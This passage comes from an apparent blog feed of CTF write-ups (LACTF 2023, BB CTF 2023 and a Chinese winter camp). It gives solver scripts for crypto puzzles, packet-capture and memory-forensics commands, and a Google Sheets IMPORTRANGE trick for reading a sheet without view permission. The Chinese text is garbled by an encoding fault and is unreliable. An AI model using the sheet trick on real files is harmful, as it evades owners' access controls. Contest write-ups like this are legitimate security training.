characters. Then, it sorts the collection, and converts it back to a string. Finally, the code prints out the result using the â€œprintâ€ function.<br>and then with the help of a tool site<a href="https://tio.run/#">https://tio.run/#</a><br><img src="/mdimg/LACTF2023/3.png"><br>Then use Cyberchefâ€™s Substitute.<br><img src="/mdimg/LACTF2023/4.png"><br>Finally, quipqiup can be blasted.</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">lactf&#123;i_guess_using_many_greek_characters_didn<span class="hljs-symbol">&#x27;t_stop_you._well_played_i_must_say.congrats</span>!&#125;<br></code></pre></td></tr></table></figure><h4 id="5-guess-the-bit"><a href="#5-guess-the-bit" class="headerlink" title="5. guess-the-bit!"></a>5. guess-the-bit!</h4><p>Carefully observe the encryption source code logic, 150 cycles are performed, and each cycle generates a random number c, which is either the square of the original number, or the product of the square of the original number and 6. So you need to guess whether the number is a square or a multiple of 6.</p><p><img src="/mdimg/LACTF2023/5.png"><br>As shown in the figure above, if both conditions are true, return â€œ1â€ to the server, otherwise return â€œ0â€. Write a script with the help of pwntools.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy.ntheory.primetest <span class="hljs-keyword">import</span> is_square <br><br>p = remote(<span class="hljs-string">&#x27;lac.tf&#x27;</span>, <span class="hljs-number">31190</span>)<br>p.recvline()<br>p.recvline()<br><br>C = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> C != <span class="hljs-number">150</span>:<br>    c = <span class="hljs-built_in">int</span>((p.recvline().decode()).split(<span class="hljs-string">&quot; &quot;</span>)[-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">if</span> c%<span class="hljs-number">6</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> is_square(c//<span class="hljs-number">6</span>):<br>        p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        p.sendline(<span class="hljs-string">b&quot;0&quot;</span>)<br>    C += <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(C,end=<span class="hljs-string">&quot;\r&quot;</span>)<br><span class="hljs-built_in">print</span>(p.recv(<span class="hljs-number">1024</span>))<br><span class="hljs-built_in">print</span>(p.recv(<span class="hljs-number">1024</span>))<br><br><span class="hljs-comment"># lactf&#123;sm4ll_pla1nt3xt_sp4ac3s_ar3n&#x27;t_al4ways_e4sy&#125;</span><br></code></pre></td></tr></table></figure><h4 id="6-chinese-lazy-theorem-2"><a href="#6-chinese-lazy-theorem-2" class="headerlink" title="6. chinese-lazy-theorem-2"></a>6. chinese-lazy-theorem-2</h4><p>According to the chinese lazy theorem, if you find <code>target % p</code> and <code>target % q</code>, you can find <code>target % pq</code>, but knowing <code>target % pq</code> is not enough, because the maximum target is <code>p*q*2*3 *5</code>, so try 30 times <code>(target % pq) + i * pq</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy.ntheory.modular <span class="hljs-keyword">import</span> crt<br><br><span class="hljs-keyword">with</span> remote(<span class="hljs-string">&quot;lac.tf&quot;</span>, <span class="hljs-number">31111</span>) <span class="hljs-keyword">as</span> r:<br>    p = <span class="hljs-built_in">int</span>(r.readline(<span class="hljs-literal">False</span>))<br>    q = <span class="hljs-built_in">int</span>(r.readline(<span class="hljs-literal">False</span>))<br>    r.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    r.readuntil(<span class="hljs-string">b&quot;Type your modulus here: &quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(p).encode())<br>    x = <span class="hljs-built_in">int</span>(r.readline(<span class="hljs-literal">False</span>))<br>    r.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    r.readuntil(<span class="hljs-string">b&quot;Type your modulus here: &quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(q).encode())<br>    y = <span class="hljs-built_in">int</span>(r.readline(<span class="hljs-literal">False</span>))<br>    a, b = crt([p,q],[x,y])<br>    r.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>        r.readuntil(<span class="hljs-string">b&quot;Type your guess here: &quot;</span>)<br>        r.sendline(<span class="hljs-built_in">str</span>(a+i*b).encode())<br>        <span class="hljs-built_in">print</span>(r.readline())<br></code></pre></td></tr></table></figure><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="1-ECB"><a href="#1-ECB" class="headerlink" title="1. ECB"></a>1. ECB</h4><p>UDP traffic analysis, using RFC 3514ï¼Œ<a href="https://www.ietf.org/rfc/rfc3514.txt">https://www.ietf.org/rfc/rfc3514.txt</a><br><img src="/mdimg/LACTF2023/7.png"></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Flags <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> abbreviation <span class="hljs-keyword">of</span> flag Segment, which <span class="hljs-keyword">is</span> a flag field.<br>It <span class="hljs-keyword">is</span> actually a field <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> IP packet header. Because most <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> TCP, UDP, <span class="hljs-keyword">and</span> <span class="hljs-built_in">application</span> layer protocols are encapsulated <span class="hljs-keyword">in</span> IP packets, you will often see this field when analyzing these protocols.<br>The identification field has <span class="hljs-number">3</span> bits.<br>Reserved bit: <span class="hljs-number">1</span> bit, which <span class="hljs-keyword">is</span> a reserved bit <span class="hljs-keyword">and</span> generally <span class="hljs-keyword">not</span> used;<br>Don&#x27;t fragment: <span class="hljs-number">1</span> bit, used <span class="hljs-keyword">to</span> indicate whether <span class="hljs-keyword">the</span> data packet <span class="hljs-keyword">is</span> fragmented (Not <span class="hljs-keyword">set</span> means <span class="hljs-keyword">that</span> <span class="hljs-keyword">the</span> data packet <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> fragmented);<br>More fragment: <span class="hljs-number">1</span> bit, used <span class="hljs-keyword">to</span> indicate whether <span class="hljs-keyword">it</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">last</span> fragment (Not <span class="hljs-keyword">set</span> means <span class="hljs-keyword">it</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">last</span> one).<br></code></pre></td></tr></table></figure><p>Check the flags field and the Data segment. The data segment has 1 byte of data.<br><img src="/mdimg/LACTF2023/8.png"><br>Looking down, in N0.5, the setting of Reserved bit has changed.<br><img src="/mdimg/LACTF2023/9.png"><br>Check RFC 3514 official document, if <code>Reserved bit</code> is set to <code>1 (0x1)</code>, it is a malicious packet.<br><img src="/mdimg/LACTF2023/10.png"><br>So we only need to filter out the packets whose <code>Reserved bit</code> is 0, set the data and Reserved bit as columns, and set the Reserved bit as 0 as the filter condition, that is, <code>ip.flags.rb == 0</code>, observe The first few discoveries are the hex values of lactf.<br><img src="/mdimg/LACTF2023/11.png"><br>Export the filtered UDP flow, open the saved UDP flow packet and track the UDP flow directly.<br><img src="/mdimg/LACTF2023/12.png"><br>You can also use tshark.</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">tshark</span> -r <span class="hljs-type">EBE</span>.pcap -<span class="hljs-type">Y</span> <span class="hljs-string">&quot;ip.flags.rb == 0x0&quot;</span> -<span class="hljs-type">T</span> fields -e <span class="hljs-class"><span class="hljs-keyword">data</span> | xxd -r -p</span><br></code></pre></td></tr></table></figure><p><img src="/mdimg/LACTF2023/13.png"></p><h4 id="2-CATS"><a href="#2-CATS" class="headerlink" title="2.CATS!"></a>2.CATS!</h4><p><img src="/mdimg/LACTF2023/14.png"><br><img src="/mdimg/LACTF2023/15.png"><br><a href="https://www.mentalfloss.com/article/576608/lanai-cat-sanctuary-hawaii-shelters-600-cats">https://www.mentalfloss.com/article/576608/lanai-cat-sanctuary-hawaii-shelters-600-cats</a>There is their official website in the article, as shown in the figure below<br><img src="/mdimg/LACTF2023/16.png"></p><h4 id="3-hidden-in-plain-sheets"><a href="#3-hidden-in-plain-sheets" class="headerlink" title="3. hidden in plain sheets"></a>3. hidden in plain sheets</h4><p>The flag is in another Sheet but we donâ€™t have permission to view it.</p><p><img src="/mdimg/LACTF2023/17.png"><br>After checking the data, I found that the <code>IMPORTRANGE</code> function of Google Sheets can import the content.<br><img src="/mdimg/LACTF2023/18.png"><br>So use IMPORTRANGE to get the flag directly<br><img src="/mdimg/LACTF2023/19.png"></p><h4 id="4-discord-l34k"><a href="#4-discord-l34k" class="headerlink" title="4. discord l34k"></a>4. discord l34k</h4><p>The topic gave a discord link</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://discord.com/channels/<span class="hljs-number">1060030874722259057</span>/<span class="hljs-number">1060030875187822724</span>/<span class="hljs-number">1060031064669700186</span><br></code></pre></td></tr></table></figure><p><a href="https://discord.com/blog/add-the-discord-widget-to-your-site/">https://discord.com/blog/add-the-discord-widget-to-your-site/</a>  Find key images in this post.<br><img src="/mdimg/LACTF2023/20.png"></p><p>Below the image see the URL for the JSON API. In the given URL, the first ID ( 1060030874722259057 ) refers to the server, so we put that in the image where the example ID is. This gives us the link.</p><p><a href="https://discordapp.com/api/servers/1060030874722259057/widget.json">https://discordapp.com/api/servers/1060030874722259057/widget.json</a><br><img src="/mdimg/LACTF2023/21.png"><br>After opening it, I found that it is an invitation link. After opening it, enter the LA CTF-Chall Server 5 server, and you can see the flag.<br><img src="/mdimg/LACTF2023/22.png"><br><img src="/mdimg/LACTF2023/23.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BB CTF 2023</title>
    <link href="/2023/02/07/BBCTF/"/>
    <url>/2023/02/07/BBCTF/</url>
    
    <content type="html"><![CDATA[<h2 id="1-Memory-Dump"><a href="#1-Memory-Dump" class="headerlink" title="1. Memory Dump"></a>1. Memory Dump</h2><h3 id="é¢˜ç›®è¯´æ˜"><a href="#é¢˜ç›®è¯´æ˜" class="headerlink" title="é¢˜ç›®è¯´æ˜"></a>é¢˜ç›®è¯´æ˜</h3><p>I was learning powershell when my pc suddenly crashed. Can you retrieve my bash history?</p><h3 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><h4 id="æ³•ä¸€"><a href="#æ³•ä¸€" class="headerlink" title="æ³•ä¸€"></a>æ³•ä¸€</h4><p>ä¹‹å‰é•¿å®‰æ¯åšè¿‡PowerShellçš„å–è¯é¢˜ï¼ŒPowerShellå†å²å‘½ä»¤æ–‡ä»¶è·¯å¾„ä¸º<br><code>%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code><br>æ‰€ä»¥æˆ‘ä»¬ç›´æ¥å»filescan<code>ConsoleHost_history.txt</code><br><img src="/mdimg/2023BBCTF/1.png"><br>è™½ç„¶æŠ¥é”™äº† ä½†è¿˜æ˜¯æ‰¾å‡ºæ¥äº†æ dumpä¸€ä¸‹<br><img src="/mdimg/2023BBCTF/2.png"><br>cat ä¸€ä¸‹ä¸‹<br><img src="/mdimg/2023BBCTF/3.png"><br>AESè§£å¯†å³å¯<br><img src="/mdimg/2023BBCTF/4.png"></p><h4 id="æ³•äºŒ"><a href="#æ³•äºŒ" class="headerlink" title="æ³•äºŒ"></a>æ³•äºŒ</h4><p>å› ä¸º<code>ConsoleHost_history.txt</code>ä¸ºæ–‡æœ¬å½¢å¼ï¼Œæ‰€ä»¥åˆ©ç”¨stringsè½¬æ¢ä¸€ä¸‹ç›´æ¥æœç´¢<code>flag&#123;</code>å³å¯<br><img src="/mdimg/2023BBCTF/5.png"></p><h2 id="2-Vastness-of-Space"><a href="#2-Vastness-of-Space" class="headerlink" title="2. Vastness of Space"></a>2. Vastness of Space</h2><h3 id="é¢˜ç›®è¯´æ˜-1"><a href="#é¢˜ç›®è¯´æ˜-1" class="headerlink" title="é¢˜ç›®è¯´æ˜"></a>é¢˜ç›®è¯´æ˜</h3><p>Is space really that empty?</p><h3 id="è§£é¢˜æ€è·¯-1"><a href="#è§£é¢˜æ€è·¯-1" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><p>æŸ¥çœ‹å›¾ç‰‡exifä¿¡æ¯<br><img src="/mdimg/2023BBCTF/6.png"><br>steghideéšå†™ passwordï¼šBBCTF<br><img src="/mdimg/2023BBCTF/7.png"><br>ç”¨matplotlibåº“è¿˜åŸä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br>data = np.genfromtxt(<span class="hljs-string">&quot;somedata.txt&quot;</span>, delimiter=<span class="hljs-string">&quot;,&quot;</span>)<br><br>num = data[:,<span class="hljs-number">0</span>]<br>data = data[:,<span class="hljs-number">1</span>]<br><br>plt.plot(num,data, <span class="hljs-string">&#x27;ro&#x27;</span>)<br><br>plt.xlabel(<span class="hljs-string">&#x27;x&#x27;</span>)<br>plt.ylabel(<span class="hljs-string">&#x27;y&#x27;</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><p><img src="/mdimg/2023BBCTF/8.png"><br>æ‰«ç å³å¯get flag</p><h2 id="3-Random-Requests"><a href="#3-Random-Requests" class="headerlink" title="3. Random Requests"></a>3. Random Requests</h2><h3 id="é¢˜ç›®è¯´æ˜-2"><a href="#é¢˜ç›®è¯´æ˜-2" class="headerlink" title="é¢˜ç›®è¯´æ˜"></a>é¢˜ç›®è¯´æ˜</h3><p>I captured these very random http requests. Can you help me decode them?</p><h3 id="è§£é¢˜æ€è·¯-2"><a href="#è§£é¢˜æ€è·¯-2" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><p>è¿‡æ»¤HTTPæµé‡å¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šGETè¯·æ±‚ flag=0/flag=1ï¼Œæ‰€ä»¥çŒœæµ‹flagå°±æ˜¯ç”±äºŒè¿›åˆ¶æ•°æ®ç»„æˆ<br><img src="/mdimg/2023BBCTF/9.png"><br>å†™è„šæœ¬&amp;æ‰‹æ’¸&amp;ç”¨tsharkæå–ä¸€ä¸‹éƒ½å¯ä»¥ï¼Œè¿™é‡Œç”¨tsharkæå–äºŒè¿›åˆ¶æ•°æ®<br><code>tshark -r random_requests.pcapng -Y &quot;http.request.method == &quot;GET&quot;&quot; | cut -d &#39;/&#39; -f2 | cut -d &#39; &#39; -f1 | cut -d &#39;=&#39; -f2 | tr -d &#39;\n&#39;</code><br><img src="/mdimg/2023BBCTF/10.png"><br>ç„¶åcyberchefä¸€æŠŠæ¢­<br><img src="/mdimg/2023BBCTF/11.png"></p><h2 id="4-Imageception"><a href="#4-Imageception" class="headerlink" title="4. Imageception"></a>4. Imageception</h2><h3 id="é¢˜ç›®è¯´æ˜-3"><a href="#é¢˜ç›®è¯´æ˜-3" class="headerlink" title="é¢˜ç›®è¯´æ˜"></a>é¢˜ç›®è¯´æ˜</h3><p>â€œThe painter has the universe in his mind and hands.â€<br>-Leonardo Da Vinci</p><h3 id="è§£é¢˜æ€è·¯-3"><a href="#è§£é¢˜æ€è·¯-3" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><p>é¢˜ç›®åç§°ä¸ºimageceptionï¼Œæ‰€ä»¥ç›´æ¥FileScanæœç´¢<br><code>python vol.py -f ./BBCTF/Imageception.raw windows.filescan.FileScan | grep &quot;imageception&quot;</code><br><img src="/mdimg/2023BBCTF/12.png"><br>å‘ç°æœ‰ä¸ª<code>imageception.png</code> æŠŠä»–dumpä¸‹æ¥<br><img src="/mdimg/2023BBCTF/13.png"><br>è¿™é‡Œæ˜¾ç¤ºError dumping file ä½†æ˜¯æ–‡ä»¶å¤¹é‡Œå·²ç»dumpå‡ºæ¥äº†ã€‚<br><img src="/mdimg/2023BBCTF/14.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¬¬äºŒå±Šå±±çŸ³ç½‘ç§‘å†¬ä»¤è¥</title>
    <link href="/2023/02/06/2023%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/"/>
    <url>/2023/02/06/2023%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h1><h2 id="HSAndroid1"><a href="#HSAndroid1" class="headerlink" title="HSAndroid1"></a>HSAndroid1</h2><p><img src="/mdimg/2023sswk/1.png"><br>ç½‘ä¸Šæ‰¾äº†ä¸ªè„šæœ¬ï¼ŒAESè§£å¯†å³å¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Crypto;<br><span class="hljs-keyword">import</span> java.security.InvalidAlgorithmParameterException;<br><span class="hljs-keyword">import</span> java.security.InvalidKeyException;<br><span class="hljs-keyword">import</span> java.security.NoSuchAlgorithmException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">import</span> javax.crypto.BadPaddingException;<br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.IllegalBlockSizeException;<br><span class="hljs-keyword">import</span> javax.crypto.NoSuchPaddingException;<br><span class="hljs-keyword">import</span> javax.crypto.SecretKey;<br><span class="hljs-keyword">import</span> javax.crypto.spec.IvParameterSpec;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Crypto</span> &#123;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">decrypt</span><span class="hljs-params">(String str2, String str22, SecretKey secretKey, IvParameterSpec ivParameterSpec)</span> <span class="hljs-keyword">throws</span> IllegalBlockSizeException, BadPaddingException, InvalidKeyException, InvalidAlgorithmParameterException, NoSuchAlgorithmException, NoSuchPaddingException &#123;<br>        <span class="hljs-type">Cipher</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> Cipher.getInstance(str2);<br>        instance.init(<span class="hljs-number">2</span>, secretKey, ivParameterSpec);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(instance.doFinal(Base64.getDecoder().decode(str22)));<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvalidKeyException, IllegalBlockSizeException, BadPaddingException, InvalidAlgorithmParameterException, NoSuchAlgorithmException, NoSuchPaddingException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">decryptedString</span> <span class="hljs-operator">=</span> decrypt(<span class="hljs-string">&quot;AES/CBC/PKCS5Padding&quot;</span>, <span class="hljs-string">&quot;HyKsaPpqT4l436tHiSEXtIlLgVV4GE7mGc2WoI0KlP2YhKFco7OPcJYtS58BFwDq&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">12</span>, <span class="hljs-number">32</span>, <span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">23</span>, <span class="hljs-number">108</span>, <span class="hljs-number">31</span>, <span class="hljs-number">108</span>, <span class="hljs-number">44</span>, <span class="hljs-number">121</span>, <span class="hljs-number">42</span>, <span class="hljs-number">121</span>, <span class="hljs-number">42</span>, <span class="hljs-number">113</span>, <span class="hljs-number">41</span>, <span class="hljs-number">124</span>&#125;, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>, <span class="hljs-string">&quot;AES&quot;</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">12</span>, <span class="hljs-number">32</span>, <span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">23</span>, <span class="hljs-number">108</span>, <span class="hljs-number">31</span>, <span class="hljs-number">108</span>, <span class="hljs-number">44</span>, <span class="hljs-number">121</span>, <span class="hljs-number">42</span>, <span class="hljs-number">121</span>, <span class="hljs-number">42</span>, <span class="hljs-number">113</span>, <span class="hljs-number">41</span>, <span class="hljs-number">124</span>&#125;));<br>        System.out.println(<span class="hljs-string">&quot;After decryption - &quot;</span> + decryptedString);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//hsnctf&#123;android_is_not_e4sy_will_caref1ul&#125;</span><br></code></pre></td></tr></table></figure><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="daobudao"><a href="#daobudao" class="headerlink" title="daobudao"></a>daobudao</h2><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">a3ZxZndpe2owMGdfb3hmbl9rZHloX2l4cX0=</span><br><span class="language-xml"></span><br><span class="language-xml">base64:</span><br><span class="language-xml">kvqfwi</span><span class="hljs-template-variable">&#123;j00g_oxfn_kdyh_ixq&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">caeser 3:</span><br><span class="language-xml">hsnctf</span><span class="hljs-template-variable">&#123;g00d_luck_have_fun&#125;</span><br></code></pre></td></tr></table></figure><h2 id="strange-chacha"><a href="#strange-chacha" class="headerlink" title="strange_chacha"></a>strange_chacha</h2><p>CryptoCTF AnielyåŸé¢˜ å‚è€ƒæ˜¥å“¥çš„wpï¼š<a href="https://zhuanlan.zhihu.com/p/545950898">https://zhuanlan.zhihu.com/p/545950898</a></p><p> chachaæµå¯†ç ï¼Œäº§ç”Ÿä¸€æ®µå¯†é’¥æµç”¨äºåŠ å¯†ï¼Œç±»ä¼¼ä¼ªéšæœºæ•°å‘ç”Ÿå™¨ï¼Œäº§ç”Ÿå¯†é’¥æµ ã€‚çˆ†ç ´ä¸€ä¸ªçŸ­éšæœºæ•°å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> itertools<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AS</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, passphrase</span>):<br>        self.passphrase = passphrase<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">go</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">mixer</span>(<span class="hljs-params">u, v</span>):<br>            <span class="hljs-keyword">return</span> ((u &lt;&lt; v) &amp; <span class="hljs-number">0xffffffff</span>) | u &gt;&gt; (<span class="hljs-number">32</span> - v)<br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">forge</span>(<span class="hljs-params">w, a, b, c, d</span>):<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>                w[a] = (w[a] + w[b]) &amp; <span class="hljs-number">0xffffffff</span><br>                w[d] = mixer(w[a] ^ w[d], <span class="hljs-number">16</span> // (i + <span class="hljs-number">1</span>))<br>                w[c] = (w[c] + w[d]) &amp; <span class="hljs-number">0xffffffff</span><br>                w[b] = mixer(w[b] ^ w[c], (<span class="hljs-number">12</span> + <span class="hljs-number">2</span>*i) // (i + <span class="hljs-number">1</span>))<br><br>        bring = [<span class="hljs-number">0</span>] * <span class="hljs-number">16</span><br>        bring[:<span class="hljs-number">4</span>] = [<span class="hljs-number">0x61707865</span>, <span class="hljs-number">0x3320646e</span>, <span class="hljs-number">0x79622d32</span>, <span class="hljs-number">0x6b206574</span>]<br>        bring[<span class="hljs-number">4</span>:<span class="hljs-number">12</span>] = unpack(<span class="hljs-string">&#x27;&lt;8L&#x27;</span>, self.passphrase)<br>        bring[<span class="hljs-number">12</span>] = bring[<span class="hljs-number">13</span>] = <span class="hljs-number">0x0</span><br>        bring[<span class="hljs-number">14</span>:] = [<span class="hljs-number">0</span>] * <span class="hljs-number">2</span><br><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            w = <span class="hljs-built_in">list</span>(bring)<br>            <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>                forge(w, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x4</span>, <span class="hljs-number">0x8</span>, <span class="hljs-number">0xc</span>)<br>                forge(w, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x5</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xd</span>)<br>                forge(w, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x6</span>, <span class="hljs-number">0xa</span>, <span class="hljs-number">0xe</span>)<br>                forge(w, <span 